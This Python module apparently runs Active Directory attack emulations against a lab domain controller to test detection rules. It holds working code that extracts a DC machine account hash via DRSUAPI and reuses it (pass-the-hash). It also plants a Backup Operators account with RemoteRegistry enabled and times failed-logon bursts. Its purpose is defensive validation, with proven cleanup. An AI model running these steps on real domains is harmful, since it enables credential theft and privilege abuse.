"""Bounded AD authentication-path validation for relay and remote-registry rules.

The executor exposes only a closed operation set. Actual DC machine credentials
are read through one-account DRSUAPI into memory, used for one authentication,
and discarded; they are never printed, returned, or written. Operations that
create a disposable principal clean it in a fresh WinRM session and then prove
the clean state from another session, retrying that pair up to CLEANUP_ATTEMPTS
times; a residue that outlives the last attempt fails the run.
"""
import re
import secrets
import time
from datetime import datetime, timezone

from executors.registry import register
from result import make_result


OPERATIONS = {
    "ephemeral_computer_ntlm",
    "machine_smb_ntlm",
    "machine_ntlm_relay_sequence",
    "machine_kerberos_relay_sequence",
    "backup_operator_remote_registry",
    "failed_logon_burst",
    "failed_logons_then_success",
}
NIGHTLY_SAFE_OPERATIONS = {
    "ephemeral_computer_ntlm", "failed_logon_burst", "failed_logons_then_success",
}
ATTACK_MARKER = "ZYBUR_AD_NETWORK_ATTACK_EXECUTED"
CLEANUP_MARKER = "ZYBUR_AD_NETWORK_CLEANUP_OK"
PROBE_MARKER = "ZYBUR_AD_NETWORK_PROBE_CLEAN"
_TOKEN = re.compile(r"^[0-9a-f]{8}$")
_HASH = re.compile(r"^[0-9a-fA-F]{32}$")
# Added 2026-10-14 (triage n=35): each cleanup here ran once, so one dropped
# WinRM session left a live disposable principal on DC1 (for the Backup Operators
# path an enabled member with a known password) behind a single exception.
# dcsync.py's ephemeral path has retried since 2026-09-05; this is the same
# discipline: cleanup in a fresh session, absence proven from another, up to
# CLEANUP_ATTEMPTS times, and a residue that survives raises with its name.
CLEANUP_ATTEMPTS = 3
CLEANUP_RETRY_DELAY_S = 1.0
# Added 2026-10-19 after four consecutive MISSED nights (09-26, 09-27, 09-28 x2)
# on ephemeral_computer_ntlm. The one historical DETECTED run (2026-09-05 09:55Z)
# followed ~149s of DC1 idle time since the prior AD-touching use-case; every
# MISSED run instead followed DC1 AD writes within under 1s (09-26: a GPO
# scheduled-task use-case ended 0.385s before this one's attack_start) or ran as
# the first AD write of the night right after lab prepare. The code itself adds
# zero delay anywhere between New-ADComputer returning and the NTLM auth attempt
# that immediately follows it over SMB, so a "cold"/busy DC1 never gets a chance
# to converge the new account into its NTLM-usable state before the auth fires -
# only incidental idle time before detonation ever provided that margin. This
# settle delay manufactures that margin deliberately instead of relying on luck.
AD_ACCOUNT_SETTLE_DELAY_S = 3.0


def _now():
    return datetime.now(timezone.utc).isoformat()


def _text(response, field):
    return (getattr(response, field, b"") or b"").decode("utf-8", "replace").strip()


def _clean_until_proven(session_factory, cleanup_ps, probe_ps, label, residue,
                        password, sleep_fn):
    """Run cleanup then its probe, each in a fresh session, until the probe is clean.

    Both scripts are idempotent and owner-guarded, so a repeat after a partial
    cleanup removes only what is left. Returns None once proven; raises after the
    last attempt with the password redacted and the residue named, so the
    operator knows what to remove by hand.
    """
    errors = []
    for attempt in range(1, CLEANUP_ATTEMPTS + 1):
        errors = []
        try:
            response = session_factory().run_ps(cleanup_ps)
            stdout, stderr = _text(response, "std_out"), _text(response, "std_err")
            if getattr(response, "status_code", 1) != 0 or CLEANUP_MARKER not in stdout:
                errors.append(f"{label} cleanup was not proven: {stderr or 'no cleanup marker'}")
        except Exception as exc:
            errors.append(f"{label} cleanup failed: {type(exc).__name__}: {exc}")
        try:
            response = session_factory().run_ps(probe_ps)
            stdout, stderr = _text(response, "std_out"), _text(response, "std_err")
            if getattr(response, "status_code", 1) != 0 or stdout.strip() != PROBE_MARKER:
                errors.append(f"{label} cleanup probe found residual state: {stderr or stdout or 'empty response'}")
        except Exception as exc:
            errors.append(f"{label} cleanup probe failed: {type(exc).__name__}: {exc}")
        if not errors:
            return
        if attempt < CLEANUP_ATTEMPTS:
            sleep_fn(CLEANUP_RETRY_DELAY_S)
    detail = (f"{label} cleanup was not proven after {CLEANUP_ATTEMPTS} attempts; "
              f"residue may remain on the DC ({residue}): " + "; ".join(errors))
    raise RuntimeError(detail.replace(password, "[REDACTED]"))


def _smb_connection(cfg, user, password="", nthash="", kerberos=False, smb_cls=None):
    if smb_cls is None:
        from impacket.smbconnection import SMBConnection as smb_cls
    remote_name = cfg.get("dc_fqdn") or cfg["win_host"]
    smb = smb_cls(remote_name, cfg["win_host"], sess_port=445)
    if kerberos:
        smb.kerberosLogin(
            user, password, cfg.get("dc_domain") or "", nthash=nthash,
            kdcHost=cfg["win_host"], useCache=False,
        )
    else:
        smb.login(user, password, cfg.get("dc_domain") or "", nthash=nthash)
    return smb


def _open_pipe(smb, pipe="samr"):
    tree = smb.connectTree("IPC$")
    handle = None
    try:
        path = "\\" + pipe
        smb.waitNamedPipe(tree, path, timeout=5)
        handle = smb.openFile(tree, path)
    finally:
        if handle is not None:
            try:
                smb.closeFile(tree, handle)
            except Exception:
                pass
        try:
            smb.disconnectTree(tree)
        except Exception:
            pass


def _read_machine_hash(cfg, account, smb_cls=None, remote_ops_cls=None, ntds_cls=None):
    """Return one NT hash to the immediate caller only; retain and print nothing."""
    if smb_cls is None:
        from impacket.smbconnection import SMBConnection as smb_cls
    if remote_ops_cls is None or ntds_cls is None:
        from impacket.examples.secretsdump import RemoteOperations, NTDSHashes
        remote_ops_cls = remote_ops_cls or RemoteOperations
        ntds_cls = ntds_cls or NTDSHashes
    smb = remote = ntds = None
    captured = []

    def capture(_secret_type, secret):
        # The callback shape is DOMAIN\account:rid:lm:nthash:::. Never include
        # the callback value in an exception: it is credential material.
        parts = str(secret).strip().split(":")
        if len(parts) >= 4 and _HASH.fullmatch(parts[3]):
            captured.append(parts[3].lower())

    try:
        remote_name = cfg.get("dc_fqdn") or cfg["win_host"]
        smb = smb_cls(remote_name, cfg["win_host"], sess_port=445)
        smb.login(cfg["win_user"], cfg["win_pass"], cfg.get("dc_domain") or "")
        remote = remote_ops_cls(smb, False)
        remote.setExecMethod("smbexec")
        ntds = ntds_cls(
            None, None, isRemote=True, remoteOps=remote, useVSSMethod=False,
            justNTLM=True, justUser=account, outputFileName=None,
            perSecretCallback=capture,
        )
        ntds.dump()
        if len(captured) != 1:
            raise RuntimeError("DRSUAPI did not return exactly one usable machine credential")
        return captured[0]
    finally:
        for obj, method in ((ntds, "finish"), (remote, "finish"), (smb, "logoff")):
            if obj is not None:
                try:
                    getattr(obj, method)()
                except Exception:
                    pass


def _machine_name(cfg):
    label = str(cfg.get("dc_fqdn") or "").split(".", 1)[0]
    if not re.fullmatch(r"[A-Za-z0-9-]{1,15}", label):
        raise ValueError("DC_FQDN must begin with a simple NetBIOS-compatible label")
    return label.upper() + "$"


def run_machine_auth(cfg, operation, hash_reader=_read_machine_hash,
                     smb_factory=_smb_connection, pipe_opener=_open_pipe):
    if cfg.get("target") != "domain_controller":
        raise ValueError("AD network executor requires target: domain_controller")
    if operation not in {
        "machine_smb_ntlm", "machine_ntlm_relay_sequence",
        "machine_kerberos_relay_sequence",
    }:
        raise ValueError(f"unsupported machine authentication operation {operation!r}")
    machine = _machine_name(cfg)
    machine_hash = hash_reader(cfg, machine)
    admin_smb = machine_smb = None
    try:
        if operation.endswith("relay_sequence"):
            admin_smb = smb_factory(cfg, cfg["win_user"], password=cfg["win_pass"])
            pipe_opener(admin_smb, "samr")
        machine_smb = smb_factory(
            cfg, machine, nthash=machine_hash,
            kerberos=(operation == "machine_kerberos_relay_sequence"),
        )
        if operation == "machine_smb_ntlm":
            pipe_opener(machine_smb, "samr")
        return "one bounded machine authentication completed; credential value discarded"
    finally:
        # Drop the last Python reference before closing unrelated handles. Python
        # cannot promise zeroization, but this prevents caching or returning it.
        machine_hash = None
        for smb in (machine_smb, admin_smb):
            if smb is not None:
                try:
                    smb.logoff()
                except Exception:
                    pass


def _ephemeral_computer_scripts(token, password):
    cn = f"ZVNTLM{token}"
    sam = "D$"  # dc1 startswith D, satisfying the rule without using DC1$.
    owner = f"Zybur AD validation:ephemeral_computer_ntlm:{token}"
    common = f"""$ErrorActionPreference = 'Stop'
Import-Module ActiveDirectory -ErrorAction Stop
$owner = '{owner}'
function Get-OwnedComputer {{
  $c = Get-ADComputer -LDAPFilter '(cn={cn})' -Properties Description,sAMAccountName -ErrorAction Stop
  if ($null -ne $c -and ($c.Description -ne $owner -or $c.SamAccountName -ne '{sam}')) {{
    throw 'refusing to touch a pre-existing AD computer with the validation name'
  }}
  return $c
}}
function Remove-OwnedComputer {{
  $c = Get-OwnedComputer
  if ($null -ne $c) {{ Remove-ADComputer -Identity $c -Confirm:$false -ErrorAction Stop }}
}}
""".strip()
    attack = f"""{common}
Remove-OwnedComputer
$collision = Get-ADComputer -LDAPFilter '(sAMAccountName={sam})' -ErrorAction Stop
if ($null -ne $collision) {{ throw 'the disposable D$ account name is already in use' }}
$secure = ConvertTo-SecureString '{password}' -AsPlainText -Force
New-ADComputer -Name '{cn}' -SamAccountName '{sam}' -Description $owner -Enabled $true -AccountPassword $secure -ErrorAction Stop
Write-Output '{ATTACK_MARKER}'
""".strip()
    cleanup = f"""{common}
Remove-OwnedComputer
Write-Output '{CLEANUP_MARKER}'
""".strip()
    probe = f"""$ErrorActionPreference = 'Stop'
Import-Module ActiveDirectory -ErrorAction Stop
$byCn = Get-ADComputer -LDAPFilter '(cn={cn})' -ErrorAction Stop
$bySam = Get-ADComputer -LDAPFilter '(sAMAccountName={sam})' -ErrorAction Stop
if ($null -ne $byCn -or $null -ne $bySam) {{ Write-Output 'ZYBUR_AD_NETWORK_RESIDUAL:computer' }}
else {{ Write-Output '{PROBE_MARKER}' }}
""".strip()
    return attack, cleanup, probe


def run_ephemeral_computer_ntlm(cfg, session_factory, token=None, password=None,
                                smb_factory=_smb_connection, sleep_fn=time.sleep):
    if cfg.get("target") != "domain_controller":
        raise ValueError("AD network executor requires target: domain_controller")
    token = token or secrets.token_hex(4)
    if not _TOKEN.fullmatch(token):
        raise ValueError("AD network token must be eight lowercase hex characters")
    password = password or ("Zy!" + secrets.token_hex(12) + "aA9")
    attack_ps, cleanup_ps, probe_ps = _ephemeral_computer_scripts(token, password)
    attack_error = None
    smb = None
    try:
        response = session_factory().run_ps(attack_ps)
        stdout, stderr = _text(response, "std_out"), _text(response, "std_err")
        if getattr(response, "status_code", 1) != 0 or ATTACK_MARKER not in stdout:
            attack_error = f"computer setup failed: {stderr or 'no execution marker'}"
        else:
            # Let the new computer account converge into its NTLM-usable state
            # before authenticating as it (see AD_ACCOUNT_SETTLE_DELAY_S above).
            sleep_fn(AD_ACCOUNT_SETTLE_DELAY_S)
            smb = smb_factory(cfg, "D$", password=password)
            smb.connectTree("IPC$")
    except Exception as exc:
        attack_error = f"computer NTLM authentication failed: {type(exc).__name__}: {exc}"
    finally:
        if smb is not None:
            try:
                smb.logoff()
            except Exception:
                pass

    _clean_until_proven(
        session_factory, cleanup_ps, probe_ps, "computer",
        f"enabled computer account ZVNTLM{token} (D$)", password, sleep_fn)
    if attack_error:
        raise RuntimeError(attack_error.replace(password, "[REDACTED]"))
    return "disposable D$ NTLM authentication completed; cleanup independently proven"


def _backup_scripts(token, password, baseline_state, baseline_mode):
    name = f"zv-bak-{token}"
    owner = f"Zybur AD validation:backup_operator_remote_registry:{token}"
    mode = {"Auto": "Automatic", "Manual": "Manual", "Disabled": "Disabled"}[baseline_mode]
    common = f"""$ErrorActionPreference = 'Stop'
Import-Module ActiveDirectory -ErrorAction Stop
$name = '{name}'
$owner = '{owner}'
function Get-OwnedUser {{
  $u = Get-ADUser -LDAPFilter '(cn={name})' -Properties Description -ErrorAction Stop
  if ($null -ne $u -and $u.Description -ne $owner) {{ throw 'refusing to touch a pre-existing validation user' }}
  return $u
}}
""".strip()
    attack = f"""{common}
if ($null -ne (Get-OwnedUser)) {{ throw 'backup validation user unexpectedly already exists' }}
$secure = ConvertTo-SecureString '{password}' -AsPlainText -Force
$u = New-ADUser -Name $name -SamAccountName $name -Description $owner -Enabled $true -AccountPassword $secure -PassThru -ErrorAction Stop
Add-ADGroupMember -Identity 'Backup Operators' -Members $u -ErrorAction Stop
$svc = Get-CimInstance Win32_Service -Filter "Name='RemoteRegistry'" -ErrorAction Stop
if ($svc.StartMode -eq 'Disabled') {{ Set-Service RemoteRegistry -StartupType Manual -ErrorAction Stop }}
if ($svc.State -ne 'Running') {{ Start-Service RemoteRegistry -ErrorAction Stop }}
Write-Output '{ATTACK_MARKER}'
""".strip()
    cleanup = f"""{common}
$u = Get-OwnedUser
if ($null -ne $u) {{ Remove-ADUser -Identity $u -Confirm:$false -ErrorAction Stop }}
if ('{baseline_state}' -eq 'Stopped') {{
  Stop-Service RemoteRegistry -Force -ErrorAction Stop
  for ($i=0; $i -lt 20; $i++) {{
    if ((Get-CimInstance Win32_Service -Filter "Name='RemoteRegistry'").State -eq 'Stopped') {{ break }}
    Start-Sleep -Milliseconds 250
  }}
}}
Set-Service RemoteRegistry -StartupType {mode} -ErrorAction Stop
Write-Output '{CLEANUP_MARKER}'
""".strip()
    probe = f"""$ErrorActionPreference = 'Stop'
Import-Module ActiveDirectory -ErrorAction Stop
$u = Get-ADUser -LDAPFilter '(cn={name})' -ErrorAction Stop
$svc = Get-CimInstance Win32_Service -Filter "Name='RemoteRegistry'" -ErrorAction Stop
if ($null -ne $u -or $svc.State -ne '{baseline_state}' -or $svc.StartMode -ne '{baseline_mode}') {{
  Write-Output 'ZYBUR_AD_NETWORK_RESIDUAL:backup-registry'
}} else {{ Write-Output '{PROBE_MARKER}' }}
""".strip()
    return name, attack, cleanup, probe


def run_backup_remote_registry(cfg, session_factory, token=None, password=None,
                               smb_factory=_smb_connection, pipe_opener=_open_pipe,
                               sleep_fn=time.sleep):
    if cfg.get("target") != "domain_controller":
        raise ValueError("AD network executor requires target: domain_controller")
    token = token or secrets.token_hex(4)
    if not _TOKEN.fullmatch(token):
        raise ValueError("AD network token must be eight lowercase hex characters")
    password = password or ("Zy!" + secrets.token_hex(12) + "aA9")
    baseline = session_factory().run_ps("""$ErrorActionPreference='Stop'
$s=Get-CimInstance Win32_Service -Filter "Name='RemoteRegistry'" -ErrorAction Stop
Write-Output ('ZYBUR_REMOTE_REGISTRY_BASELINE:'+$s.State+':'+$s.StartMode)""")
    line = next((x for x in _text(baseline, "std_out").splitlines()
                 if x.startswith("ZYBUR_REMOTE_REGISTRY_BASELINE:")), "")
    parts = line.split(":")
    if getattr(baseline, "status_code", 1) != 0 or len(parts) != 3:
        raise RuntimeError("could not establish RemoteRegistry baseline")
    state, mode = parts[1], parts[2]
    if state not in {"Running", "Stopped"} or mode not in {"Auto", "Manual", "Disabled"}:
        raise RuntimeError("RemoteRegistry baseline had an unsupported state")
    name, attack_ps, cleanup_ps, probe_ps = _backup_scripts(
        token, password, state, mode)
    attack_error = None
    smb = None
    try:
        response = session_factory().run_ps(attack_ps)
        stdout, stderr = _text(response, "std_out"), _text(response, "std_err")
        if getattr(response, "status_code", 1) != 0 or ATTACK_MARKER not in stdout:
            attack_error = f"backup account setup failed: {stderr or 'no execution marker'}"
        else:
            smb = smb_factory(cfg, name, password=password)
            pipe_opener(smb, "winreg")
    except Exception as exc:
        attack_error = f"remote registry access failed: {type(exc).__name__}: {exc}"
    finally:
        if smb is not None:
            try:
                smb.logoff()
            except Exception:
                pass

    _clean_until_proven(
        session_factory, cleanup_ps, probe_ps, "backup account",
        f"enabled user {name} in Backup Operators; RemoteRegistry baseline {state}/{mode}",
        password, sleep_fn)
    if attack_error:
        raise RuntimeError(attack_error.replace(password, "[REDACTED]"))
    return "Backup Operators winreg access completed; account and service state independently restored"


def _failed_auth_scripts(token, password):
    # Five disabled accounts produce resolved-SID failures without consuming a
    # lockout counter.  A sixth enabled account supplies the success leg.
    names = [f"zv-f{i}-{token}" for i in range(1, 7)]
    owner = f"Zybur AD validation:failed_logons_then_success:{token}"
    quoted = ",".join(f"'{name}'" for name in names)
    common = f"""$ErrorActionPreference = 'Stop'
Import-Module ActiveDirectory -ErrorAction Stop
$names = @({quoted})
$owner = '{owner}'
function Remove-OwnedUsers {{
  foreach ($name in $names) {{
    $u = Get-ADUser -LDAPFilter "(sAMAccountName=$name)" -Properties Description -ErrorAction Stop
    if ($null -ne $u) {{
      if ($u.Description -ne $owner) {{ throw 'refusing to touch a pre-existing validation user' }}
      Remove-ADUser -Identity $u -Confirm:$false -ErrorAction Stop
    }}
  }}
}}
""".strip()
    attack = f"""{common}
Remove-OwnedUsers
$secure = ConvertTo-SecureString '{password}' -AsPlainText -Force
for ($i = 0; $i -lt $names.Count; $i++) {{
  $enabled = ($i -eq 5)
  New-ADUser -Name $names[$i] -SamAccountName $names[$i] -Description $owner -Enabled $enabled -AccountPassword $secure -ErrorAction Stop
}}
Write-Output '{ATTACK_MARKER}'
""".strip()
    cleanup = f"""{common}
Remove-OwnedUsers
Write-Output '{CLEANUP_MARKER}'
""".strip()
    probe = f"""$ErrorActionPreference = 'Stop'
Import-Module ActiveDirectory -ErrorAction Stop
$names = @({quoted})
$found = @($names | ForEach-Object {{ Get-ADUser -LDAPFilter "(sAMAccountName=$_)" -ErrorAction Stop }})
if ($found.Count -gt 0) {{ Write-Output 'ZYBUR_AD_NETWORK_RESIDUAL:failed-logon-users' }}
else {{ Write-Output '{PROBE_MARKER}' }}
""".strip()
    return names, attack, cleanup, probe


def _password_auth_succeeds(cfg, user, password, smb_factory=_smb_connection):
    smb = None
    try:
        smb = smb_factory(cfg, user, password=password)
        smb.connectTree("IPC$")
        return True
    except Exception:
        return False
    finally:
        if smb is not None:
            try:
                smb.logoff()
            except Exception:
                pass


def run_failed_logons_then_success(cfg, session_factory, token=None, password=None,
                                   auth_fn=_password_auth_succeeds, sleep_fn=time.sleep):
    if cfg.get("target") != "domain_controller":
        raise ValueError("AD network executor requires target: domain_controller")
    token = token or secrets.token_hex(4)
    if not _TOKEN.fullmatch(token):
        raise ValueError("AD network token must be eight lowercase hex characters")
    password = password or ("Zy!" + secrets.token_hex(12) + "aA9")
    names, attack_ps, cleanup_ps, probe_ps = _failed_auth_scripts(token, password)
    attack_error = None
    try:
        response = session_factory().run_ps(attack_ps)
        stdout, stderr = _text(response, "std_out"), _text(response, "std_err")
        if getattr(response, "status_code", 1) != 0 or ATTACK_MARKER not in stdout:
            attack_error = f"failed-logon account setup failed: {stderr or 'no execution marker'}"
        else:
            outcomes = [auth_fn(cfg, name, password) for name in names[:5]]
            if any(outcomes):
                attack_error = "a disabled disposable credential was accepted"
            elif not auth_fn(cfg, names[5], password):
                attack_error = "the final disposable credential authentication did not succeed"
    except Exception as exc:
        attack_error = f"bounded failed-logon sequence failed: {type(exc).__name__}: {exc}"

    _clean_until_proven(
        session_factory, cleanup_ps, probe_ps, "failed-logon account",
        f"users {', '.join(names)}, the last one enabled", password, sleep_fn)
    if attack_error:
        raise RuntimeError(attack_error.replace(password, "[REDACTED]"))
    return "five disabled disposable-account failures followed by one enabled-account success; cleanup independently proven"


def _failed_burst_scripts(token, password):
    # Disabled accounts never consume a lockout counter. Their names deliberately
    # contain "admin" because one target rule selects privileged-looking names;
    # both are random, owned validation objects and never receive group membership.
    names = [f"zv-admin-a-{token}", f"zv-admin-b-{token}"]
    owner = f"Zybur AD validation:failed_logon_burst:{token}"
    quoted = ",".join(f"'{name}'" for name in names)
    common = f"""$ErrorActionPreference = 'Stop'
Import-Module ActiveDirectory -ErrorAction Stop
$names = @({quoted})
$owner = '{owner}'
function Remove-OwnedUsers {{
  foreach ($name in $names) {{
    $u = Get-ADUser -LDAPFilter "(sAMAccountName=$name)" -Properties Description -ErrorAction Stop
    if ($null -ne $u) {{
      if ($u.Description -ne $owner) {{ throw 'refusing to touch a pre-existing burst-validation user' }}
      Remove-ADUser -Identity $u -Confirm:$false -ErrorAction Stop
    }}
  }}
}}
""".strip()
    attack = f"""{common}
Remove-OwnedUsers
$secure = ConvertTo-SecureString '{password}' -AsPlainText -Force
foreach ($name in $names) {{
  New-ADUser -Name $name -SamAccountName $name -Description $owner -Enabled $false -AccountPassword $secure -ErrorAction Stop
}}
Write-Output '{ATTACK_MARKER}'
""".strip()
    cleanup = f"""{common}
Remove-OwnedUsers
Write-Output '{CLEANUP_MARKER}'
""".strip()
    probe = f"""$ErrorActionPreference = 'Stop'
Import-Module ActiveDirectory -ErrorAction Stop
$names = @({quoted})
$found = @($names | ForEach-Object {{ Get-ADUser -LDAPFilter "(sAMAccountName=$_)" -ErrorAction Stop }})
if ($found.Count -gt 0) {{ Write-Output 'ZYBUR_AD_NETWORK_RESIDUAL:failed-logon-burst-users' }}
else {{ Write-Output '{PROBE_MARKER}' }}
""".strip()
    return names, attack, cleanup, probe


def run_failed_logon_burst(cfg, session_factory, token=None, password=None,
                           auth_fn=_password_auth_succeeds, sleep_fn=time.sleep,
                           now_fn=lambda: datetime.now(timezone.utc)):
    """Emit 110 failures for two disabled disposable admin-shaped accounts.

    The ES|QL targets bucket on a fixed 60-second boundary. Start near the front
    of a minute so the complete burst lands in one bucket, and use ten events of
    headroom above the stricter rule's threshold of 100. No real account is tried
    and disabled accounts do not accumulate a lockout counter.
    """
    if cfg.get("target") != "domain_controller":
        raise ValueError("AD network executor requires target: domain_controller")
    token = token or secrets.token_hex(4)
    if not _TOKEN.fullmatch(token):
        raise ValueError("AD network token must be eight lowercase hex characters")
    password = password or ("Zy!" + secrets.token_hex(12) + "aA9")
    names, attack_ps, cleanup_ps, probe_ps = _failed_burst_scripts(token, password)
    attack_error = None
    attempted = 0
    try:
        response = session_factory().run_ps(attack_ps)
        stdout, stderr = _text(response, "std_out"), _text(response, "std_err")
        if getattr(response, "status_code", 1) != 0 or ATTACK_MARKER not in stdout:
            attack_error = f"failed-logon burst account setup failed: {stderr or 'no execution marker'}"
        else:
            second = now_fn().second
            if second > 15:
                sleep_fn(62 - second)
            for i in range(110):
                attempted += 1
                if auth_fn(cfg, names[i % 2], password):
                    attack_error = "a disabled disposable burst credential was accepted"
                    break
    except Exception as exc:
        attack_error = f"bounded failed-logon burst failed: {type(exc).__name__}: {exc}"

    _clean_until_proven(
        session_factory, cleanup_ps, probe_ps, "failed-logon burst",
        f"disabled users {', '.join(names)}", password, sleep_fn)
    if attack_error:
        raise RuntimeError(attack_error.replace(password, "[REDACTED]"))
    if attempted != 110:
        raise RuntimeError(f"failed-logon burst stopped after {attempted} of 110 attempts")
    return "110 failures across two disabled disposable admin-shaped accounts; cleanup independently proven"


def run_operation(cfg, operation, session_factory):
    if operation not in OPERATIONS:
        raise ValueError(f"unknown AD network operation {operation!r}")
    if operation == "ephemeral_computer_ntlm":
        return run_ephemeral_computer_ntlm(cfg, session_factory)
    if operation == "backup_operator_remote_registry":
        return run_backup_remote_registry(cfg, session_factory)
    if operation == "failed_logon_burst":
        return run_failed_logon_burst(cfg, session_factory)
    if operation == "failed_logons_then_success":
        return run_failed_logons_then_success(cfg, session_factory)
    return run_machine_auth(cfg, operation)


@register("ad_network")
def ad_network(usecase, ctx):
    start = _now()
    try:
        summary = run_operation(
            ctx.cfg or {}, (usecase.get("params") or {}).get("operation"),
            ctx.winrm_factory,
        )
        return make_result(
            usecase, "SUCCESS", True, attack_start=start, attack_end=_now(), output=summary,
        )
    except Exception as exc:
        msg = str(exc)
        for secret in ((ctx.cfg or {}).get("win_pass"), (ctx.cfg or {}).get("dc_pass")):
            if secret:
                msg = msg.replace(str(secret), "[REDACTED]")
        return make_result(
            usecase, f"ERROR: {type(exc).__name__}: {msg}", False,
            attack_start=start, attack_end=_now(),
        )
